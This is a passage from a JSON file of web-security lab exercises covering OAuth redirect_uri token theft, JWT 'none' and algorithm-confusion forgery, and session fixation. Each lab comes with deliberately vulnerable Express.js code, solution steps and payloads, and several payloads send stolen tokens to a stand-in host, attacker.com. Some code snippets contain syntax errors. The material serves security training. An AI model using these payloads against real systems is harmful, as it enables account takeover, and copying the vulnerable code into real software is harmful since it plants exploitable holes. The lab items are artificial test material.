      "Host a malicious redirect_uri like http://attacker.com/capture.html that reads window.location.hash and sends it to your server.",
      "Change the OAuth redirect_uri to http://attacker.com/capture.html and trick Carlos into logging in.",
      "Once Carlos logs in, capture the token and use Postman to authenticate to /private-data.",
      "Verify that you’ve accessed Carlos’s data and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const tokens = { 'carlos-token': 'carlos' }; app.get('/private-data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (tokens[token] === 'carlos') { res.json({ username: 'carlos', data: 'Sensitive info' }); } else { res.status(403).json({ error: 'Unauthorized' }); } }); app.listen(5012);",
    "payloads": [
      "Redirect URI: http://attacker.com/capture.html",
      "Captured Token: carlos-token",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "GraphQL Session Fixation in Login Mutation",
    "Lab Description": "This lab’s GraphQL API suffers from session fixation due to insecure session token reuse. The application does not issue a fresh session ID upon login, allowing an attacker to fixate the victim's session. To solve: log in as Carlos after pre-setting the session token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the initial /graphql request and observe the Set-Cookie header with the session token.",
      "Send a crafted GraphQL mutation to login with your own credentials while retaining the fixed session token.",
      "Send the same session token to the victim, enticing them to log in (e.g., via social engineering).",
      "Once Carlos logs in, reuse the same fixed session token in your browser.",
      "Access /my-account using the hijacked session to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const schema = buildSchema(`type Query { dummy: String } type Mutation { login(username: String!, password: String!): String }`); const users = [{ username: 'carlos', password: 'supersecure' }]; const root = { login: ({ username, password }, req) => { const user = users.find(u => u.username === username && u.password === password); if (user) { return req.cookies.session || 'fixed-session-token'; } else { throw new Error('Invalid credentials'); } } }; app.use('/graphql', graphqlHTTP((req) => ({ schema, rootValue: root, graphiql: true })) ); app.listen(5015);",
    "payloads": [
      "{\"query\":\"mutation { login(username: \\\"carlos\\\", password: \\\"supersecure\\\") }\"}",
      "Cookie: session=fixed-session-token",
      "GraphQL Mutation with valid credentials using pre-fixed session cookie"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Acceptance in Authorization Header",
    "Lab Description": "This application trusts JWT tokens in the Authorization header without properly validating the algorithm field, accepting 'alg':'none'. Attackers can forge tokens without a valid signature. To solve: create an unsigned admin token and access the /admin-dashboard.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture a valid JWT token using Burp Suite during a login process.",
      "Modify the JWT header to set \"alg\" to \"none\" and strip the signature section.",
      "Change the payload to {\"username\":\"admin\",\"role\":\"admin\"}.",
      "Use Postman to send a request to /admin-dashboard with the forged Authorization Bearer token.",
      "Confirm that the admin dashboard is accessible and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); app.get('/admin-dashboard', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.role === 'admin') { res.send('Welcome, Admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(5016);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"} header JWT",
      "Unsigned admin JWT token"
    ]
  },
  {
    "Lab scenario": "OAuth Open Redirect and Token Leakage",
    "Lab Description": "This OAuth flow lacks proper redirect URI validation, allowing attackers to use open redirects to steal access tokens. The vulnerable behavior involves reflecting the access token in a user-controlled URL. To solve: steal Carlos's token via a malicious redirect URL and use it to access /private-files.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the OAuth redirect flow and identify the lack of a whitelist for redirect_uri.",
      "Craft a malicious redirect_uri pointing to https://attacker.com/capture?token={access_token}.",
      "Send a phishing link to Carlos containing this redirect_uri and wait for him to authenticate.",
      "Intercept the token at your attacker-controlled endpoint.",
      "Replay the token in the Authorization header using Postman to access /private-files and solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/callback', (req, res) => { const { redirect_uri, token } = req.query; if (redirect_uri) { res.redirect(`${redirect_uri}?token=${token}`); } else { res.status(400).send('Missing redirect URI'); } }); app.get('/private-files', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Carlos confidential data'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5017);",
    "payloads": [
      "https://attacker.com/capture?token={access_token}",
      "Authorization: Bearer carlos-oauth-token",
      "Phished token: carlos-oauth-token"
    ]
  },
  {
    "Lab scenario": "API Session Fixation via Predictable Session ID in REST Login",
    "Lab Description": "This application's REST login endpoint sets a session ID derived from the username hash, which can be predicted. The application fails to generate a new session token post-login. To solve: predetermine Carlos's session ID and access the /dashboard endpoint using this session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept your own login attempt and observe the Set-Cookie session token format.",
      "Using NodeJS crypto library, predict the hash of the username 'carlos' to craft the expected session token.",
      "Manually set your browser's session cookie to the calculated 'carlos' token using Burp's 'Add Cookie' feature.",
      "Access the /dashboard endpoint with the forged session cookie.",
      "Confirm Carlos's account is accessible to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const crypto = require('crypto'); const app = express(); const bodyParser = require('body-parser'); const cookieParser = require('cookie-parser'); app.use(bodyParser.json()); app.use(cookieParser()); const users = ['alice', 'carlos']; app.post('/login', (req, res) => { const { username, password } = req.body; if (users.includes(username) && password === 'Password123') { const session = crypto.createHash('md5').update(username).digest('hex'); res.cookie('session', session); res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const session = req.cookies.session; if (session === crypto.createHash('md5').update('carlos').digest('hex')) { res.send('Welcome Carlos!'); } else { res.status(403).send('Access denied'); } }); app.listen(5020);",
    "payloads": [
      "d404559f602eab6fd2d2fef748b9d3c0",
      "Set-Cookie: session=d404559f602eab6fd2d2fef748b9d3c0",
      "Predict hash: MD5('carlos')"
    ]
  },
  {
    "Lab scenario": "JWT Signature Confusion Vulnerability in Bearer Authorization",
    "Lab Description": "The application uses JWT tokens but inconsistently verifies the signature algorithm. If a token uses 'HS256' instead of 'RS256', the server misinterprets the public RSA key as a shared HMAC secret, enabling signature spoofing. To solve: craft a signed HS256 token impersonating the admin and access /admin.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite during a login process.",
      "Change the 'alg' in the header to 'HS256' and set the payload to {\"role\":\"admin\"}.",
      "Use the public RSA key (downloaded from the /.well-known/jwks.json endpoint) as the secret for HS256.",
      "Sign the token using any JWT library and send it via Authorization: Bearer.",
      "Access /admin and verify admin access is granted to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access denied'); } } catch (e) { res.status(401).send('Invalid Token'); } }); app.listen(5021);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"role\":\"admin\"}",
      "Secret: [Public RSA Key from /.well-known/jwks.json]",
      "Valid HS256 signed admin token"
    ]
  },
  {
    "Lab scenario": "OAuth2 Implicit Flow Token Leak via Referer Header",
    "Lab Description": "This application uses OAuth2 implicit flow but embeds the access token in the URL fragment, causing the browser to leak the token via Referer headers. To solve: capture Carlos's token from the Referer log and replay it to access /protected.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept browsing after OAuth login and observe Referer headers in outgoing requests.",
      "Identify requests where the access_token appears in the Referer header directed to third-party resources.",
      "Extract the leaked token and use Postman to send a GET request to /protected with Authorization: Bearer.",
      "Access the protected page and confirm Carlos's data is exposed.",
      "Log the token reuse to complete the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth-callback', (req, res) => { res.send('<script>location.href=\"/welcome#access_token=carlos-oauth-token\"</script>'); }); app.get('/protected', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Protected data for Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5022);",
    "payloads": [
      "Referer: https://target.com/welcome#access_token=carlos-oauth-token",
      "Authorization: Bearer carlos-oauth-token",
      "Captured access_token from Referer log"
    ]
  },
  {
    "Lab scenario": "Session Fixation via URL-based Token in Single-Page Application",
    "Lab Description": "This lab's single-page login flow passes session identifiers via the URL rather than setting them after authentication. The application reuses this identifier without regenerating it upon successful login. To solve: inject your own crafted session ID before Carlos logs in and hijack the session when he authenticates.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to spider the app and discover that the session ID is passed as a URL parameter (/login?session=).",
      "Manually supply a predictable value for the session parameter during your own login and confirm it persists across requests.",
      "Send Carlos a crafted phishing link containing your chosen session ID and wait for the session to become valid.",
      "Once Carlos logs in, reuse the crafted session token to access /my-dashboard.",
      "Validate success by accessing the page and confirming Carlos's personalized content."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('cookie-parser')()); const sessions = {}; app.get('/login', (req, res) => { let session = req.query.session || Math.random().toString(36).substring(2); res.cookie('session', session); res.send('Session initiated'); }); app.post('/authenticate', (req, res) => { const session = req.cookies.session; const { username } = req.body; if (username === 'carlos') { sessions[session] = username; res.send('Logged in'); } else { res.status(401).send('Invalid user'); } }); app.get('/my-dashboard', (req, res) => { const session = req.cookies.session; if (sessions[session] === 'carlos') { res.send('Carlos Dashboard Access'); } else { res.status(403).send('Access Denied'); } }); app.listen(5050);",
    "payloads": [
      "/login?session=attacker123",
      "Cookie: session=attacker123",
      "Injected phishing link: https://victimsite.com/login?session=attacker123"
    ]
  },
  {
    "Lab scenario": "JWT None Algorithm Bypass in Authentication Header",
    "Lab Description": "This application uses JWT for user authentication but does not properly validate the signature algorithm. If the token's 'alg' field is set to 'none', the server skips verification. To solve: craft a token with 'alg':'none' and 'username':'carlos' and access /account.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Intercept an existing Authorization Bearer token using Burp Suite.",
      "Modify the JWT header to set 'alg' to 'none' and remove the signature part.",
      "Set the payload to {\"username\":\"carlos\"} using any JWT generator.",
      "Send the forged token in the Authorization header to /account using Postman.",
      "Confirm successful login by accessing Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.decode(token); if (decoded.username === 'carlos') { res.send('Welcome back Carlos!'); } else { res.status(403).send('Access Denied'); } } catch { res.status(400).send('Invalid token'); } }); app.listen(5051);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Unsigned JWT: [Base64(header)].[Base64(payload)]."
    ]
  },
  {
    "Lab scenario": "OAuth Authorization Code Interception via Open Redirect",
    "Lab Description": "This OAuth implementation allows arbitrary redirection of authorization codes to third-party sites through the vulnerable 'redirect_uri' parameter. The server fails to validate the host. To solve: capture Carlos's authorization code and exchange it for an access token.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to modify the 'redirect_uri' during your own OAuth login to confirm that external domains are accepted.",
      "Send Carlos a phishing link with the crafted redirect_uri pointing to your controlled server.",
      "Use a simple HTTP server to capture the redirected request and extract the authorization code.",
      "Exchange the intercepted code for an access token using Postman with a POST request to /oauth/token.",
      "Use the token to access /protected and confirm Carlos's user profile data is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const code = 'authcode-carlos'; res.redirect(`${redirectUri}?code=${code}`); }); app.post('/oauth/token', (req, res) => { const { code } = req.body; if (code === 'authcode-carlos') { res.json({ access_token: 'access-token-carlos' }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/protected', (req, res) => { const authHeader = req.headers.authorization; if (authHeader === 'Bearer access-token-carlos') { res.send('Carlos Protected Content'); } else { res.status(401).send('Unauthorized'); } }); app.listen(5052);",
    "payloads": [
      "https://vulnerable-app.com/authorize?redirect_uri=http://attacker.com",
      "POST /oauth/token {\"code\":\"authcode-carlos\"}",
      "Authorization: Bearer access-token-carlos"
    ]
  },
  {
    "Lab scenario": "JWT token signature confusion vulnerability in API authentication",
    "Lab Description": "This lab uses JSON Web Tokens to secure user sessions. The backend mistakenly trusts tokens signed with both HMAC and RSA keys depending on the 'alg' field, which makes it possible to craft a valid token using the public key as an HMAC secret. To solve: forge a token with admin privileges using algorithm confusion and access the /admin endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the login JWT using Burp Suite and note the header specifies 'RS256' algorithm.",
      "Extract the public key from the application or its .well-known/jwks.json endpoint.",
      "Craft a new JWT header with 'alg' set to 'HS256' and use the public key as the HMAC secret to sign it.",
      "Modify the payload to {\"username\":\"carlos\",\"role\":\"admin\"} and submit the token via Postman to /admin.",
      "Verify admin-level access by confirming the /admin endpoint responds with sensitive data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const publicKey = fs.readFileSync('./public.pem'); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); if (decoded.role === 'admin') { res.send('Sensitive admin data for carlos'); } else { res.status(403).send('Access Denied'); } } catch (e) { res.status(400).send('Invalid token'); } }); app.listen(6001);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\",\"role\":\"admin\"}",
      "Signature: HMAC(publicKey, base64Url(header) + '.' + base64Url(payload))"
    ]
  },
  {
    "Lab scenario": "Session fixation via unvalidated 'session_id' in OAuth callback flow",
    "Lab Description": "This OAuth-enabled app accepts a 'session_id' from the user during the authorization flow, which it reuses to bind the session after token exchange without validation. To solve: inject a fixed session ID and access Carlos's authenticated session after his login completes.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to observe the 'session_id' parameter being passed in the OAuth callback flow.",
      "Manually alter the 'session_id' in the authorization request to a known value (e.g., 'attackersession').",
      "Send Carlos a phishing link that includes the 'session_id=attackersession' parameter.",
      "After Carlos authenticates, reuse the 'attackersession' cookie to access /profile as Carlos.",
      "Confirm compromise by seeing Carlos's profile data on the /profile page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/callback', (req, res) => { const sessionId = req.query.session_id; const code = req.query.code; if (code === 'authcode-carlos') { res.cookie('session_id', sessionId); res.send('OAuth login successful'); } else { res.status(401).send('Invalid code'); } }); app.get('/profile', (req, res) => { if (req.cookies.session_id === 'attackersession') { res.send('Carlos profile data exposed'); } else { res.status(403).send('Access Denied'); } }); app.listen(6002);",
    "payloads": [
      "/oauth/callback?session_id=attackersession&code=authcode-carlos",
      "Cookie: session_id=attackersession",
      "Phishing link: https://target.com/oauth/authorize?session_id=attackersession"
    ]
  },
  {
    "Lab scenario": "Improper OAuth scope validation in REST API Authorization Flow",
    "Lab Description": "This lab uses OAuth to authorize API access. The backend trusts the client-provided scope without verifying it server-side, allowing privilege escalation by modifying the scope parameter. To solve: request an access token with elevated scope 'admin' and use it to access /admin/data.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the OAuth authorization request and locate the 'scope' parameter.",
      "Modify the 'scope' to include 'admin' before submitting the request.",
      "Exchange the authorization code for a token at /oauth/token using Postman.",
      "Use the new token to access /admin/data endpoint.",
      "Confirm the lab is solved when admin-level sensitive data is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.post('/oauth/token', (req, res) => { const { code, scope } = req.body; if (code === 'valid-auth-code') { res.json({ access_token: 'token-for-' + scope }); } else { res.status(400).json({ error: 'Invalid code' }); } }); app.get('/admin/data', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-admin') { res.send('Admin level confidential data'); } else { res.status(403).send('Forbidden'); } }); app.listen(6003);",
    "payloads": [
      "scope=admin",
      "POST /oauth/token {\"code\":\"valid-auth-code\",\"scope\":\"admin\"}",
      "Authorization: Bearer token-for-admin"
    ]
  },
  {
    "Lab scenario": "Session fixation vulnerability in cookie-based login",
    "Lab Description": "The application assigns session IDs before authentication and does not regenerate them upon successful login. This allows an attacker to set a session ID, trick a victim into using it, and hijack the account after login. To solve: fix the session ID, log in as the victim using the same session ID, and access their private dashboard.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to observe the Set-Cookie header during unauthenticated navigation to /login.",
      "Manually fix the session ID by forcing the same cookie value before authentication.",
      "Trick Carlos into logging in via a phishing link that uses the predefined session ID.",
      "Reuse the same session ID cookie to access /dashboard after Carlos logs in.",
      "Verify the takeover by confirming the /dashboard page shows Carlos's private data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.get('/login', (req, res) => { if (!req.cookies.sessionid) { res.cookie('sessionid', Math.random().toString(36).substr(2)); } res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users.find(u => u.username === username && u.password === password)) { res.send('Logged in as ' + username); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { if (req.cookies.sessionid === 'fixedsessionid') { res.send('Welcome Carlos, your sensitive data is here.'); } else { res.status(403).send('Access denied.'); } }); app.listen(7001);",
    "payloads": [
      "Cookie: sessionid=fixedsessionid",
      "Phishing URL: http://target.com/login?sessionid=fixedsessionid",
      "Hijack Access: GET /dashboard with Cookie: sessionid=fixedsessionid"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to missing signature verification",
    "Lab Description": "The application accepts JWT tokens for authentication but does not verify their signatures due to a misconfigured token parser. This allows an attacker to forge arbitrary tokens and impersonate other users. To solve: craft a JWT token with the payload for 'admin' access and submit it to /admin-panel.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Capture the login JWT token using Burp Suite.",
      "Notice the lack of signature validation by modifying the token payload and observing unchanged server behavior.",
      "Craft a new JWT token with payload: {\"user\":\"carlos\",\"role\":\"admin\"} and leave the signature empty.",
      "Send the forged token in the Authorization header to the /admin-panel endpoint.",
      "Confirm the lab is solved when admin data for Carlos is shown."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); app.get('/admin-panel', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = JSON.parse(Buffer.from(token.split('.')[1], 'base64').toString()); if (decoded.role === 'admin') { res.send('Admin panel for carlos'); } else { res.status(403).send('Access Denied'); } }); app.listen(7002);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
      "Signature: (empty)"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow misconfiguration allows token interception",
    "Lab Description": "The app uses OAuth's implicit grant flow with tokens exposed in the URL fragment, which is accessible to malicious scripts due to the lack of proper CSP headers. To solve: steal the access token via a crafted JavaScript payload and use it to access /api/userinfo as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, observe the redirect URI contains the access token in the URL fragment.",
      "Inject a malicious JavaScript payload via the referer parameter in the OAuth request.",
      "Host a script that captures window.location.hash and exfiltrates the access token to your server.",
      "Replay the intercepted token to /api/userinfo using Postman.",
      "Confirm the lab is solved by retrieving Carlos's private profile from the endpoint."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.get('/oauth/authorize', (req, res) => { const redirectUri = req.query.redirect_uri; const token = 'access-token-for-carlos'; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/api/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') { res.send('Private data for carlos'); } else { res.status(403).send('Access Denied'); } }); app.listen(7003);",
    "payloads": [
      "Malicious Redirect: http://attacker.com/capture#access_token=",
      "JavaScript Snippet: window.location.hash.split('=')[1]",
      "Authorization: Bearer access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion attack in token verification logic",
    "Lab Description": "The application uses JWT for authentication but incorrectly trusts the algorithm specified in the token header. This allows an attacker to switch from HMAC to 'none' algorithm and forge tokens. To solve: manipulate the JWT header to use 'none', craft a valid admin payload, and access the protected /admin route.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the login request and retrieve the issued JWT token.",
      "Modify the JWT header to set 'alg' to 'none' and observe if the backend accepts the unsigned token.",
      "Create a new token with payload {\"user\":\"carlos\",\"role\":\"admin\"} and leave the signature blank.",
      "Send the forged token in an Authorization: Bearer header to /admin.",
      "Access the admin dashboard and confirm the lab is solved by reading Carlos's sensitive data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const jwt = require('jsonwebtoken'); app.use(require('body-parser').json()); app.get('/admin', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded.payload.role === 'admin') { res.send('Welcome Admin Carlos!'); } else { res.status(403).send('Access Denied'); } }); app.listen(5000);",
    "payloads": [
      "Header: {\"alg\":\"none\",\"typ\":\"JWT\"}",
      "Payload: {\"user\":\"carlos\",\"role\":\"admin\"}",
      "Signature: (empty)"
    ]
  },
  {
    "Lab scenario": "Session fixation via static session token in GraphQL mutation",
    "Lab Description": "The application uses GraphQL for authentication but assigns a session token before login that is not regenerated post-login. This allows an attacker to predefine a token, send it to the victim, and hijack their session once the victim logs in. To solve: fix a session token, hijack the user's session, and access the profile endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to monitor the GraphQL /graphql endpoint and note that the 'session' cookie is assigned on initial contact.",
      "Send a GraphQL mutation with your fixed session cookie and observe it persists after login.",
      "Send the fixed session link to Carlos and wait for him to log in.",
      "After Carlos authenticates, reuse the same fixed session cookie and access /graphql to query for { user { profile } }.",
      "Confirm that Carlos's profile data is retrieved using the fixed session token."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use(require('express-graphql')({ schema: require('graphql').buildSchema('type Query { profile: String }'), rootValue: { profile: () => 'User: Carlos profile data' }, graphiql: true })); app.use((req, res, next) => { if (!req.cookies.session) res.cookie('session', 'static-session-id'); next(); }); app.listen(5001);",
    "payloads": [
      "Cookie: session=static-session-id",
      "GraphQL Query: { user { profile } }",
      "Phishing Link: http://target.com/graphql?session=static-session-id"
    ]
  },
  {
    "Lab scenario": "OAuth open redirect token theft in redirect_uri validation",
    "Lab Description": "The application uses OAuth authorization but fails to properly validate the redirect_uri parameter, allowing attackers to steal tokens via an open redirect. To solve: craft a malicious redirect_uri pointing to your controlled server, extract Carlos's token, and access /userinfo using it.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, intercept the OAuth authorization flow and note that redirect_uri is insufficiently validated.",
      "Modify the redirect_uri parameter to use your attacker-controlled domain.",
      "Deploy a malicious server to capture the token fragment via window.location.hash.",
      "Use Postman to send an Authorization header with the stolen token to /userinfo.",
      "Confirm the lab is solved when Carlos's personal user information is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.use(require('body-parser').json()); app.get('/oauth/authorize', (req, res) => { const token = 'carlos-oauth-token'; const redirectUri = req.query.redirect_uri; res.redirect(redirectUri + '#access_token=' + token); }); app.get('/userinfo', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'carlos-oauth-token') { res.send('Sensitive profile data for Carlos'); } else { res.status(403).send('Unauthorized'); } }); app.listen(5002);",
    "payloads": [
      "redirect_uri=http://attacker.com/capture",
      "JavaScript: window.location.hash.split('=')[1]",
      "Authorization: Bearer carlos-oauth-token"
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session IDs in REST login flow",
    "Lab Description": "The application issues session IDs before user authentication, and these tokens are not regenerated upon successful login. This lets an attacker pre-fixate a session token, send it to a victim, and hijack their authenticated session. To solve: pre-assign a session ID, trick the victim to log in with it, and access the /dashboard endpoint.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Using Burp Suite, intercept the GET /login request and observe the server sets a session cookie before login.",
      "Confirm that the session remains unchanged after successful login.",
      "Manually set the session cookie to a fixed value in Burp Repeater and send a phishing link to the victim.",
      "Once the victim logs in using the fixated session ID, reuse this same session cookie in your browser.",
      "Access the /dashboard endpoint and confirm successful access to the victim's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); app.use((req, res, next) => { if (!req.cookies.sessionID) res.cookie('sessionID', 'sess-' + Date.now()); next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (username === 'carlos' && password === 'qwerty') { res.send('Login successful'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { if (req.cookies.sessionID) res.send('Welcome to Carlos's Dashboard'); else res.status(401).send('Please login'); }); app.listen(4005);",
    "payloads": [
      "sessionID=sess-1713456700",
      "Login credentials: username=carlos&password=qwerty",
      "Reuse sessionID in subsequent requests"
    ]
  },
  {
    "Lab scenario": "JWT secret key disclosure via verbose error logging in token validation",
    "Lab Description": "The application uses a poorly configured JWT validation library that leaks internal errors to the client, exposing the secret signing key when token verification fails. To solve: submit a malformed token, extract the secret from the error response, craft a valid admin token, and access /admin-panel.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Postman, send a deliberately corrupted JWT token in the Authorization header and inspect the HTTP response.",
      "Note the verbose error revealing the secret key used for HMAC signature validation.",
      "Rebuild a valid JWT with payload {\"user\":\"carlos\",\"role\":\"admin\"} and sign it using the disclosed secret.",
      "Submit the signed token as a Bearer token in a request to /admin-panel.",
      "Confirm successful admin access when Carlos's admin dashboard is displayed."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const secret = 'SuperSecretSigningKey'; app.get('/admin-panel', (req, res) => { try { const token = req.headers.authorization.split(' ')[1]; const decoded = jwt.verify(token, secret); if (decoded.role === 'admin') res.send('Welcome to Carlos's Admin Panel'); else res.status(403).send('Forbidden'); } catch (e) { res.status(500).send(`Error: ${e.message}`); } }); app.listen(4010);",
    "payloads": [
      "Malformed token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.payload",
      "{\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "{\"user\":\"carlos\",\"role\":\"admin\"} signed with SuperSecretSigningKey"
    ]
  },
  {
    "Lab scenario": "OAuth implicit flow token leakage via referer header mismanagement",
    "Lab Description": "The application implements OAuth implicit flow but fails to clear the referer header after redirection, leaking the access token to third-party domains. To solve: intercept the Referer header after redirection to extract the victim's token, use it to access /user/settings.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, monitor HTTP requests during the OAuth implicit flow and note that the access token is appended to the redirect URL fragment.",
      "Deploy a controlled page with an embedded image or link pointing to the vulnerable redirect endpoint.",
      "Force the victim to click this crafted link so their access token is exposed via the Referer header to your server.",
      "Extract the token from your server logs and use Postman to send it as an Authorization Bearer token to /user/settings.",
      "Confirm access to Carlos's settings to solve the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth/authorize', (req, res) => { const token = 'access-token-for-carlos'; res.redirect(`${req.query.redirect_uri}#access_token=${token}`); }); app.get('/user/settings', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'access-token-for-carlos') res.send('Carlos's User Settings'); else res.status(401).send('Unauthorized'); }); app.listen(4020);",
    "payloads": [
      "Phishing link: http://vulnerable-app.com/auth/authorize?redirect_uri=http://attacker.com/callback",
      "Referer Header: http://attacker.com/callback#access_token=access-token-for-carlos",
      "Authorization: Bearer access-token-for-carlos"
    ]
  },
  {
    "Lab scenario": "Session mismanagement via insecure logout endpoint",
    "Lab Description": "The application's logout function fails to invalidate session cookies on the server, allowing attackers to reuse a hijacked token. The application continues to trust old session cookies even after the user logs out. To solve: capture the session cookie pre-logout and reuse it to access /account/profile after the user logs out.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "With Burp Suite running, intercept your own login request and capture the Set-Cookie header for the session.",
      "Log out from the application and note the server does not invalidate the cookie on logout.",
      "Replay the original session cookie manually via Burp Repeater to confirm the session is still active.",
      "Inject the session cookie into a browser's cookie store and refresh /account/profile.",
      "Verify that the page loads with authenticated user content, solving the lab."
    ],
